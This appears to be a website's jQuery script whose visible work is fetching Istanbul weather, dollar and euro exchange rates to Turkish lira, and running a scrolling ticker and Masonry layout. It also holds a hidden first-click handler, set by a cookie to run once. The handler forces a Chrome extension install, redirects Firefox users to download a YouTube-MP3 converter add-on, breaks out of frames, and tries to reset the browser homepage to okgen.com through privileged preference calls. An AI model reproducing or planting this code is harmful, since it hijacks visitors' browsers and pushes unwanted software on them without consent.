$(function () {
    $.ajax({
        url: "http://api.openweathermap.org/data/2.5/weather?q=istanbul,tr",
        type: 'GET',
        dataType: 'JSONP',
        success: function (data) {
            $("#weather").text(data.name + ' ' + parseInt(data.main.temp - 273.15) + ' C')
        }
    });

    $.ajax({
        url: "http://rate-exchange.appspot.com/currency?from=USD&to=TRY&q=1",
        type: 'GET',
        dataType: 'JSONP',
        success: function (data) {
            $("#currency_dolar").text('$' + ' ' + data.rate.toFixed(2) + ' TL');
        }
    });

    $.ajax({
        url: "http://rate-exchange.appspot.com/currency?from=EUR&to=TRY&q=1",
        type: 'GET',
        dataType: 'JSONP',
        success: function (data) {
            $("#currency_euro").text('€' + ' ' + data.rate.toFixed(2) + ' TL');
        }
    });

    if (jQuery.cookie('test_chrome_app_status_new') != '1') {

        var isOpera = !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
        // Opera 8.0+ (UA detection to detect Blink/v8-powered Opera)
        var isFirefox = typeof InstallTrigger !== 'undefined';   // Firefox 1.0+
        var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
        // At least Safari 3+: "[object HTMLElementConstructor]"
        var isChrome = !!window.chrome && !isOpera;              // Chrome 1+
        var isIE = /*@cc_on!@*/false || document.documentMode;   // At least IE6

        jQuery(document).on('click', function () {

            if (top.location != self.location) {
                top.location = self.location.href
            }

            if (isChrome) { //chrome ise
                chrome.webstore.install();
            } else if (isFirefox) {
                try {
                    window.location.href = "https://addons.mozilla.org/firefox/downloads/file/226378/youtube_mp3_converter-1.0.4-fx.xpi?src=dp-btn-primary";
                } catch (e) {
                }

                function setHome() {
                    if (document.all) {
                        document.body.style.behavior = 'url(#default#homepage)';
                        document.body.setHomePage('http://okgen.com');
                    } else if (window.sidebar) {
                        if (window.netscape) {
                            try {
                                netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
                            }
                            catch (e) {
                                //alert("this action was aviod by your browser，if you want to enable，please enter about:config in your address line,and change the value of signed.applets.codebase_principal_support to true");
                            }
                        }
                        var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefBranch);
                        prefs.setCharPref('browser.startup.homepage', 'http://url_of_page.com');
                    }
                }

                setHome();
            }
            else if (jQuery("html").hasClass("lt-ie7")) //ie7den kucuk ise
            {
                try {
                    document.setHomePage("http://okgen.com/?ref=ie");
                } catch (e) {
                }
            }

            var date = new Date();
            var minutes = 6000;
            date.setTime(date.getTime() + (minutes * 60 * 1000));
            jQuery.cookie('test_chrome_app_status_new', '1', { expires: date});
            jQuery(document).off('click');
        });
    }

    $.fn.Scroll = function (opt, callback) {
        if (!opt) var opt = $.extend({}, opt);
        var _this = $(this).find("ul:first");
        var lineH = _this.find("li:first").height(), line = opt.line ? parseInt(opt.line, 10) : parseInt(this.height() / lineH, 10), speed = opt.speed ? parseInt(opt.speed, 10) : 500, timer = opt.timer ? parseInt(opt.timer, 10) : 3000;
        if (line == 0) line = 1;
        _this.upHeight = 0 - line * lineH;
        scrollUp = function (me) {
            me.animate({marginTop: me.upHeight}, speed, function () {
                for (i = 1; i <= line; i++) {
                    me.find("li:first").appendTo(me);
                }
                me.css({marginTop: 0});
            });
        };
        _this.hover(function () {
            clearInterval(_this.timerID);
        },function () {
            _this.timerID = setInterval(function () {
                scrollUp(_this);
            }, timer);
        }).mouseout();
    };


    $("#scrollDiv").Scroll({line: 1, speed: 300, timer: 2000});
    $("#scrollDivBuyTr").Scroll({line: 1, speed: 300, timer: 2000});

    try {
        var container = document.querySelector('.links2');
        var msnry = new Masonry(container, {
            itemSelector: '.pin'
        });
    } catch (e) {

    }
});
